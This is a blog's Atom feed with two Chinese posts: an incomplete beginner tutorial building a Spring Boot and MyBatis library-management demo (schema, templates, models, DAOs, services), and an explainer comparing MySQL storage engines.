<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-24T22:58:25-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
&lt;a href=&quot;mailto:verylazycat@outlook.com&quot;&gt;
  &lt;i class=&quot;fas fa-envelope&quot;&gt;&lt;/i&gt;
&lt;/a&gt;
&lt;a href=&quot;https://github.com/verylazycat&quot;&gt;
  &lt;i class=&quot;fab fa-github&quot;&gt;&lt;/i&gt;
&lt;/a&gt;
</subtitle><entry><title type="html">图书管理系统demo</title><link href="http://localhost:4000/_posts/2020-07-23-%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdemo/" rel="alternate" type="text/html" title="图书管理系统demo" /><published>2020-07-23T00:00:00-04:00</published><updated>2020-07-23T00:00:00-04:00</updated><id>http://localhost:4000/_posts/%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdemo</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-23-%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdemo/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;创建数据库&quot;&gt;创建数据库&lt;/h1&gt;

&lt;p&gt;连接&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mysql -u root -p
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;创建BookManager&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;create database BookManager;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;创建book表&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;use BookManager;
DROP TABLE IF EXISTS `book`;

CREATE TABLE `book` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(256) DEFAULT NULL,
  `author` varchar(256) DEFAULT NULL,
  `price` varchar(256) DEFAULT NULL,
  `status` int(11) DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

LOCK TABLES `book` WRITE;

INSERT INTO `book` (`id`, `name`, `author`, `price`, `status`)
VALUES
	(1,'枪毙任老道','大英雄王思文','100￥',0),
	(2,'论一个演员的自我修养','斯坦尼斯拉夫斯基','20.40￥',0);
UNLOCK TABLES;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;创建ticket表&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;DROP TABLE IF EXISTS `ticket`;

CREATE TABLE `ticket` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `ticket` varchar(1024) DEFAULT NULL,
  `expired_at` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uid` (`user_id`),
  UNIQUE KEY `t` (`ticket`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;创建user表&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;DROP TABLE IF EXISTS `user`;
CREATE TABLE `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(256) DEFAULT NULL,
  `email` varchar(256) DEFAULT '',
  `password` varchar(256) DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;配置pom文件&quot;&gt;配置pom文件&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
    &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;
    &amp;lt;parent&amp;gt;
        &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
        &amp;lt;artifactId&amp;gt;spring-boot-starter-parent&amp;lt;/artifactId&amp;gt;
        &amp;lt;version&amp;gt;2.3.1.RELEASE&amp;lt;/version&amp;gt;
        &amp;lt;relativePath/&amp;gt; &amp;lt;!-- lookup parent from repository --&amp;gt;
    &amp;lt;/parent&amp;gt;
    &amp;lt;groupId&amp;gt;com.lazycat&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;lazycat&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;0.0.1-SNAPSHOT&amp;lt;/version&amp;gt;
    &amp;lt;name&amp;gt;lazycat&amp;lt;/name&amp;gt;
    &amp;lt;description&amp;gt;Demo project for Spring Boot&amp;lt;/description&amp;gt;

    &amp;lt;properties&amp;gt;
        &amp;lt;java.version&amp;gt;1.8&amp;lt;/java.version&amp;gt;
    &amp;lt;/properties&amp;gt;

    &amp;lt;dependencies&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;spring-boot-starter-web&amp;lt;/artifactId&amp;gt;
        &amp;lt;/dependency&amp;gt;

        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;spring-boot-starter-test&amp;lt;/artifactId&amp;gt;
            &amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt;
            &amp;lt;exclusions&amp;gt;
                &amp;lt;exclusion&amp;gt;
                    &amp;lt;groupId&amp;gt;org.junit.vintage&amp;lt;/groupId&amp;gt;
                    &amp;lt;artifactId&amp;gt;junit-vintage-engine&amp;lt;/artifactId&amp;gt;
                &amp;lt;/exclusion&amp;gt;
            &amp;lt;/exclusions&amp;gt;
        &amp;lt;/dependency&amp;gt;
    &amp;lt;/dependencies&amp;gt;

    &amp;lt;build&amp;gt;
        &amp;lt;plugins&amp;gt;
            &amp;lt;plugin&amp;gt;
                &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;spring-boot-maven-plugin&amp;lt;/artifactId&amp;gt;
            &amp;lt;/plugin&amp;gt;
        &amp;lt;/plugins&amp;gt;
    &amp;lt;/build&amp;gt;

&amp;lt;/project&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;404页面&quot;&gt;404页面&lt;/h1&gt;

&lt;p&gt;在templates目录下新建404.html&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;
    &amp;lt;title&amp;gt;404&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;404&amp;lt;/h1&amp;gt;
&amp;lt;h1&amp;gt;${error}&amp;lt;/h1&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;前端页面&quot;&gt;前端页面&lt;/h1&gt;

&lt;p&gt;在templates/book目录下新建addbook,html&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;
    &amp;lt;title&amp;gt;添加图书&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;添加图书&amp;lt;/h1&amp;gt;
&amp;lt;form action=&quot;/books/add/do&quot; method=&quot;post&quot;&amp;gt;
    &amp;lt;P&amp;gt;书名: &amp;lt;input type=&quot;text&quot; name=&quot;name&quot;/&amp;gt;&amp;lt;/P&amp;gt;
    &amp;lt;P&amp;gt;作者: &amp;lt;input type=&quot;text&quot; name=&quot;author&quot;/&amp;gt;&amp;lt;/P&amp;gt;
    &amp;lt;P&amp;gt;价格: &amp;lt;input type=&quot;text&quot; name=&quot;price&quot;/&amp;gt;&amp;lt;/P&amp;gt;
    &amp;lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在templates/book目录下新建books.html&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;
    &amp;lt;title&amp;gt;图书列表&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;div align=&quot;center&quot;&amp;gt;
    &amp;lt;h3&amp;gt;图书列表&amp;lt;/h3&amp;gt;
    &amp;lt;h4 id=&quot;status&quot;&amp;gt;&amp;lt;/h4&amp;gt;

    &amp;lt;#if host??&amp;gt;
    &amp;lt;table cellpadding=&quot;10&quot;&amp;gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;${host.name}&amp;lt;/td&amp;gt;
            &amp;lt;td&amp;gt;&amp;lt;a href=&quot;/users/logout/do&quot;&amp;gt;退出登录&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
    &amp;lt;/table&amp;gt;
    &amp;lt;#else&amp;gt;
    &amp;lt;h5&amp;gt;未登录！&amp;lt;a href=&quot;/users/login&quot;&amp;gt;登陆/&amp;lt;/a&amp;gt;&amp;lt;a href=&quot;/users/register&quot;&amp;gt;注册&amp;lt;/a&amp;gt;&amp;lt;/h5&amp;gt;
&amp;lt;/#if&amp;gt;

&amp;lt;table border=&quot;1&quot; cellpadding=&quot;10&quot;&amp;gt;
    &amp;lt;tr&amp;gt;
        &amp;lt;td&amp;gt;ID&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;书名&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;作者&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;价格&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;状态&amp;lt;/td&amp;gt;
        &amp;lt;td colspan=&quot;2&quot; align=&quot;center&quot;&amp;gt;&amp;lt;a href=&quot;/books/add&quot; target=&quot;_blank&quot;&amp;gt;Add&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;
    &amp;lt;/tr&amp;gt;
    &amp;lt;#list books as book&amp;gt;
    &amp;lt;tr&amp;gt;
        &amp;lt;td&amp;gt;&amp;lt;a&amp;gt;${book.id}&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;《${book.name}》&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;${book.author}&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;${book.price}&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;&amp;lt;#if book.status == 0&amp;gt; 在库 &amp;lt;#elseif book.status == 1&amp;gt; 已借出 &amp;lt;/#if&amp;gt;&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;&amp;lt;a href=&quot;/books/${book.id}/delete&quot;&amp;gt;借书&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;&amp;lt;a href=&quot;/books/${book.id}/recover&quot;&amp;gt;还书&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;
    &amp;lt;/tr&amp;gt;
&amp;lt;/#list&amp;gt;
&amp;lt;/table&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在login目录下新建loginhtml&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
	&amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;
	&amp;lt;title&amp;gt;用户登录&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;用户登录&amp;lt;/h1&amp;gt;
&amp;lt;form action=&quot;/users/login/do&quot; method=&quot;post&quot;&amp;gt;
	&amp;lt;p&amp;gt;邮箱： &amp;lt;input type=&quot;text&quot; name=&quot;email&quot; /&amp;gt;&amp;lt;/p&amp;gt;
	&amp;lt;p&amp;gt;密码： &amp;lt;input type=&quot;text&quot; name=&quot;password&quot; /&amp;gt;&amp;lt;/p&amp;gt;
	&amp;lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在login目录下新建register.html&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
	&amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;
	&amp;lt;title&amp;gt;用户注册&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;用户注册&amp;lt;/h1&amp;gt;
&amp;lt;form action=&quot;/users/register/do&quot; method=&quot;post&quot;&amp;gt;
	&amp;lt;p&amp;gt;昵称： &amp;lt;input type=&quot;text&quot; name=&quot;name&quot; /&amp;gt;&amp;lt;/p&amp;gt;
	&amp;lt;p&amp;gt;邮箱： &amp;lt;input type=&quot;text&quot; name=&quot;email&quot; /&amp;gt;&amp;lt;/p&amp;gt;
	&amp;lt;p&amp;gt;密码： &amp;lt;input type=&quot;text&quot; name=&quot;password&quot; /&amp;gt;&amp;lt;/p&amp;gt;
	&amp;lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;curd&quot;&gt;CURD&lt;/h1&gt;

&lt;p&gt;在model目录下创建Book.java&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;import lombok.Data;

@Data
public class Book {
    private int id;
    private  String name;
    private  String author;
    private  String price;
    private int status;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里使用了&lt;code&gt;lombok&lt;/code&gt;自动实现get,set等方法&lt;/p&gt;

&lt;p&gt;同理,在model目录下新建Ticket.java&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;import lombok.Data;

import java.util.Date;
@Data
public class Ticket {
    private  int id;
    private int userId;
    private  String ticket;
    //过期时间
    private Date exporedAt;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在model目录下新建User.java&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;import lombok.Data;

@Data
public class User {
    private  int id;
    private String name;
    private String email;
    //md5加密
    private String password;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;ok,主要部分已经写好了&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;现在写DAO&lt;/p&gt;

&lt;p&gt;在dao目录下新建BookDAO.java&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;import com.lazycat.lazycat.model.Book;
import org.apache.ibatis.annotations.*;

import java.util.List;

@Mapper
public interface BookDAO {
    String table_name = &quot; book &quot;;
    String insert_field = &quot; name,author,price &quot;;
    String select_field = &quot; id,status, &quot;+insert_field;
    @Select({&quot;select&quot;,select_field,&quot;from&quot;,table_name})
    List&amp;lt;Book&amp;gt; selectAll();
    @Insert({&quot;insert into&quot;,table_name,&quot;(&quot;,insert_field,&quot;) values (#{name},#{author},#{price})&quot;})
    int addBook(Book book);
    @Update({&quot;update&quot;,table_name,&quot; set status=#{status} where id=#{id}&quot;})
    void updateBookStatus(@Param(&quot;id&quot;) int id,@Param(&quot;status&quot;) int status);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;主要是数据库交互&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在dao目录下新建TicketDAO.java&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;import com.lazycat.lazycat.model.Ticket;
import org.apache.ibatis.annotations.Delete;
import org.apache.ibatis.annotations.Insert;
import org.apache.ibatis.annotations.Mapper;
import org.apache.ibatis.annotations.Select;

@Mapper
public interface TicketDAO {
    String table_name = &quot; ticket &quot;;
    String insert_field = &quot; user_id, ticket,expired_at&quot;;
    String select_field = &quot; id, &quot;+insert_field;

    @Insert({&quot;insert into&quot;, table_name, &quot;(&quot;, insert_field,
            &quot;) values (#{userId},#{ticket},#{expiredAt})&quot;})
    int addTicket(Ticket ticket);
    @Select({&quot;select&quot;, select_field, &quot;from&quot;, table_name, &quot;where user_id=#{uid}&quot;})
    Ticket selectByUserId(int uid);

    @Select({&quot;select&quot;, select_field, &quot;from&quot;, table_name, &quot;where ticket=#{t}&quot;})
    Ticket selectByTicket(String t);

    @Delete({&quot;delete from&quot;, table_name, &quot; where id=#{tid}&quot;})
    void deleteTicketById(int tid);

    @Delete({&quot;delete from&quot;, table_name, &quot; where ticket=#{t}&quot;})
    void deleteTicket(String t);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同理新建UserDAO&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;import com.lazycat.lazycat.model.User;
import org.apache.ibatis.annotations.Insert;
import org.apache.ibatis.annotations.Mapper;
import org.apache.ibatis.annotations.Select;
import org.apache.ibatis.annotations.Update;

@Mapper
public interface UserDAO {
    String table_name = &quot; user &quot;;
    String insert_field = &quot; name, email, password &quot;;
    String select_field = &quot; id, &quot; + insert_field;

    @Insert({&quot;insert into&quot;, table_name, &quot;(&quot;, insert_field,
            &quot;) values (#{name},#{email},#{password})&quot;})
    int addUser(User user);

    @Select({&quot;select&quot;, select_field, &quot;from&quot;, table_name, &quot;where id=#{id}&quot;})
    User selectById(int id);

    @Select({&quot;select&quot;, select_field, &quot;from&quot;, table_name, &quot;where name=#{name}&quot;})
    User selectByName(String name);

    @Select({&quot;select&quot;, select_field, &quot;from&quot;, table_name, &quot;where email=#{email}&quot;})
    User selectByEmail(String email);

    @Update({&quot;update&quot;, table_name, &quot;set password=#{password} where id=#{id}&quot;})
    void updatePassword(User user);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;service&quot;&gt;service&lt;/h1&gt;

&lt;p&gt;在service新建BookService.java&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;import com.lazycat.lazycat.dao.BookDAO;
import com.lazycat.lazycat.model.Book;
import com.lazycat.lazycat.model.enums.BookStatusEnum;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.util.List;

@Service
public class BookService {
    @Autowired(required = false)
    private BookDAO bookDAO;

    public List&amp;lt;Book&amp;gt; getAllBooks(){
        return bookDAO.selectAll();
    }
    public int addBooks(Book book){
        return  bookDAO.addBook(book);
    }

    public void deleteBooks(int id){
        bookDAO.updateBookStatus(id, BookStatusEnum.DELETE.getValue());
    }
    public  void recoverBook(int id){
        bookDAO.updateBookStatus(id,BookStatusEnum.NORMAL.getValue());
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同理新建TicketService.java&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;import com.lazycat.lazycat.dao.TicketDAO;
import com.lazycat.lazycat.model.Ticket;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

@Service
public class TicketService {
    @Autowired(required = false)
    private TicketDAO ticketDAO;

    public void addTicket(Ticket ticket){
        ticketDAO.addTicket(ticket);
    }
    public Ticket getTicket(int uid){
        return ticketDAO.selectByUserId(uid);
    }
    public  void deleteTicket(int tid){
        ticketDAO.deleteTicketById(tid);
    }
    public void deleteTicket(String t){
        ticketDAO.deleteTicket(t);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;新建UserService&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;import com.lazycat.lazycat.dao.UserDAO;
import com.lazycat.lazycat.model.User;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

@Service
public class UserService {
    @Autowired(required = false)
    private UserDAO userDAO;

    public  int addUser(User user){
        return userDAO.addUser(user);
    }
    public  User getUser(String email){
        return userDAO.selectByEmail(email);
    }
    public  User getUser(int uid){
        return  userDAO.selectById(uid);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;controller&quot;&gt;controller&lt;/h1&gt;

&lt;p&gt;在controller目录下新建BookController.java&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="JAVA" /><summary type="html">[toc]</summary></entry><entry><title type="html">MySql存储引擎</title><link href="http://localhost:4000/_posts/2020-07-22-MySql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/" rel="alternate" type="text/html" title="MySql存储引擎" /><published>2020-07-22T00:00:00-04:00</published><updated>2020-07-22T00:00:00-04:00</updated><id>http://localhost:4000/_posts/MySql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-22-MySql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;什么是存储引擎&quot;&gt;什么是存储引擎&lt;/h1&gt;

&lt;p&gt;数据库存储引擎是数据库底层软件组件，数据库管理系统使用数据引擎进行创建、查询、更新和删除数据操作。不同的存储引擎提供不同的存储机制、索引技巧、锁定水平等功能，使用不同的存储引擎还可以获得特定的功能。&lt;/p&gt;

&lt;p&gt;现在许多数据库管理系统都支持多种不同的存储引擎。MySQL 的核心就是存储引擎。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;提示：InnoDB 事务型数据库的首选引擎，支持事务安全表（ACID），支持行锁定和外键。MySQL 5.5.5 之后，InnoDB 作为默认存储引擎&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;MyISAM 是基于 ISAM 的存储引擎，并对其进行扩展，是在 Web、数据仓储和其他应用环境下最常使用的存储引擎之一。MyISAM 拥有较高的插入、查询速度，但不支持事务。&lt;/p&gt;

&lt;p&gt;MEMORY 存储引擎将表中的数据存储到内存中，为查询和引用其他数据提供快速访问。&lt;/p&gt;

&lt;h1 id=&quot;mysql-57-支持的存储引擎&quot;&gt;MySQL 5.7 支持的存储引擎&lt;/h1&gt;

&lt;p&gt;MySQL 支持多种类型的数据库引擎，可分别根据各个引擎的功能和特性为不同的数据库处理任务提供各自不同的适应性和灵活性。在 MySQL 中，可以利用 &lt;code&gt;SHOW ENGINES&lt;/code&gt; 语句来显示可用的数据库引擎和默认引擎。&lt;/p&gt;

&lt;p&gt;MySQL 提供了多个不同的存储引擎，包括处理事务安全表的引擎和处理非事务安全表的引擎。在 MySQL 中，不需要在整个服务器中使用同一种存储引擎，针对具体的要求，可以对每一个表使用不同的存储引擎。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Support 列的值表示某种引擎是否能使用，&lt;code&gt;YES&lt;/code&gt;表示可以使用，&lt;code&gt;NO&lt;/code&gt;表示不能使用，&lt;code&gt;DEFAULT&lt;/code&gt;表示该引擎为当前默认的存储引擎。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;如何选择-mysql-存储引擎&quot;&gt;如何选择 MySQL 存储引擎&lt;/h1&gt;

&lt;p&gt;不同的存储引擎都有各自的特点，以适应不同的需求，如表所示。为了做出选择，首先要考虑每一个存储引擎提供了哪些不同的功能。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;功能&lt;/th&gt;
      &lt;th&gt;MylSAM&lt;/th&gt;
      &lt;th&gt;MEMORY&lt;/th&gt;
      &lt;th&gt;InnoDB&lt;/th&gt;
      &lt;th&gt;Archive&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;存储限制&lt;/td&gt;
      &lt;td&gt;256TB&lt;/td&gt;
      &lt;td&gt;RAM&lt;/td&gt;
      &lt;td&gt;64TB&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;支持事务&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;Yes&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;支持全文索引&lt;/td&gt;
      &lt;td&gt;Yes&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;支持树索引&lt;/td&gt;
      &lt;td&gt;Yes&lt;/td&gt;
      &lt;td&gt;Yes&lt;/td&gt;
      &lt;td&gt;Yes&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;支持哈希索引&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;Yes&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;支持数据缓存&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;N/A&lt;/td&gt;
      &lt;td&gt;Yes&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;支持外键&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;Yes&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;1、事务安全
InnoDB支持事务安全,MyISAM和MEMORY两个不支持。&lt;/p&gt;

&lt;p&gt;2、储存限制
InnoDB有64TB的存储限制，MyISAM和MEMORY要是具体情况而定。&lt;/p&gt;

&lt;p&gt;3、空间使用
InnoDB对空间使用程度较高，MyISAM和MEMORY对空间使用程度较低。&lt;/p&gt;

&lt;p&gt;4、内存使用
InnoDB和MEMORY对内存使用程度较高，MyISAM对内存使用程度较低。&lt;/p&gt;

&lt;p&gt;5、插入数据的速度：
InnoDB插入数据的速度较低，MyISAM和MEMORY插入数据的速度较高。&lt;/p&gt;

&lt;p&gt;6、对外键的支持：
InnoDB对外键支持情况较好，MyISAM和MEMORY两个不支持外键。&lt;/p&gt;

&lt;p&gt;可以根据以下的原则来选择 MySQL 存储引擎：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如果要提供提交、回滚和恢复的事务安全（ACID 兼容）能力，并要求实现并发控制，InnoDB 是一个很好的选择。&lt;/li&gt;
  &lt;li&gt;如果数据表主要用来插入和查询记录，则 MyISAM 引擎提供较高的处理效率。&lt;/li&gt;
  &lt;li&gt;如果只是临时存放数据，数据量不大，并且不需要较高的数据安全性，可以选择将数据保存在内存的 MEMORY 引擎中，MySQL 中使用该引擎作为临时表，存放查询的中间结果。&lt;/li&gt;
  &lt;li&gt;如果只有 INSERT 和 SELECT 操作，可以选择Archive 引擎，Archive 存储引擎支持高并发的插入操作，但是本身并不是事务安全的。Archive 存储引擎非常适合存储归档数据，如记录日志信息可以使用 Archive 引擎。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;三种引擎特点如下：
1、InnoDB存储引擎InnoDB是事务型数据库的首选引擎，支持事务安全表（ACID），其它存储引擎都是非事务安全表，支持行锁定和外键，MySQL5.5以后默认使用InnoDB存储引擎。&lt;/p&gt;

&lt;p&gt;InnoDB特点： 支持事务处理，支持外键，支持崩溃修复能力和并发控制。如果需要对事务的完整性要求比较高（比如银行），要求实现并发控制（比如售票），那选择InnoDB有很大的优势。&lt;/p&gt;

&lt;p&gt;如果需要频繁的更新、删除操作的数据库，也可以选择InnoDB，因为支持事务的提交（commit）和回滚（rollback）。&lt;/p&gt;

